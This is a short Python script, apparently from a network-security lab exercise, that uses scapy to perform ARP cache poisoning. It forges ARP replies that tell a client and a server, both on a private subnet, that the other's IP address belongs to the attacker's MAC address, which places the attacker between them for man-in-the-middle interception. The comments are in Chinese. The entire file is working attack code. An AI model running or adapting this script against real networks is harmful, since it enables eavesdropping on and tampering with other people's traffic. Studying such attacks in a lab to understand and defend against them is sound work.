from scapy.all import *
from scapy.layers.http import HTTPResponse
import time

# client
client_ip = "192.168.3.10"
client_mac = "02:99:c2:70:22:6c"
# server
server_ip = "192.168.3.1"
server_mac = "02:12:5c:6a:b2:a4"
# attacker
attacker_ip = "192.168.3.11"
attacker_mac= "02:bb:50:e7:34:ce"

def build_arp_response(target_ip, target_mac, victim_ip, victim_mac):
    """构造一个arp响应数据包以实现ARP缓存投毒，以将 target_mac - target_ip 插入到victim的arp缓存中。"""
    # 构造一个以太网帧。由于是广播，所以可以不设置目的MAC地址
    E = Ether(src=target_mac, dst=victim_mac)
    # 构造一个ARP数据包。
    A = ARP(op=2, hwsrc=target_mac, psrc=target_ip, pdst=victim_ip)
    # 将两个数据组合成完整的数据帧。
    frame = E/A
    return frame

# 构造两个应答包，分别对正常用户与网关投毒
frame2client = build_arp_response(server_ip, attacker_mac, client_ip, client_mac)
frame2server = build_arp_response(client_ip, attacker_mac, server_ip, server_mac)
# 发送两个应答包，实现双方投毒
sendp(frame2client)
sendp(frame2server)